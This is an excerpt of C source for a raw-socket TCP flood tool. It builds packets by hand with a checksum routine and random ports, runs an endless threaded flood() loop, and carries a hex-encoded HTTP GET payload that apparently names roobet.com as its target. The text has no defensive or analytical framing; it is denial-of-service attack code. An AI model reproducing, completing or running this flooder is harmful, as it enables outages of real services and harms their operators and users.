...
unsigned int cwr = 1;
static const char PAYLOAD[] = "\x47\x45\x54\x20\x2f\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x5c\x72\x5c\x6e\x48\x6f\x73\x74\x3a\x72\x6f\x6f\x62\x65\x74\x2e\x63\x6f\x6d\x5c\x72\x5c\x6e\x5c\x72\x5c\x6e";
...
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int PAYLOADSIZE)
{
    ...
    pseudohead.length = htons(sizeof(struct tcphdr) + PAYLOADSIZE);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + PAYLOADSIZE;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + PAYLOADSIZE);
...
int ports[4] = {53, 443, 22, 80};
void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(ports[randnum(0, 4)]);
    tcph->check = 0;
   ...
   // tcph->ack = 1;
    ...
    tcph->doff = ((sizeof(struct tcphdr)) + PAYLOADSIZE) / 4;
}
void *flood(void *par1)
{
    ...
    while (1)
    {
        ...
        tcph->dest = htons(ports[randnum(0, 4)]); 
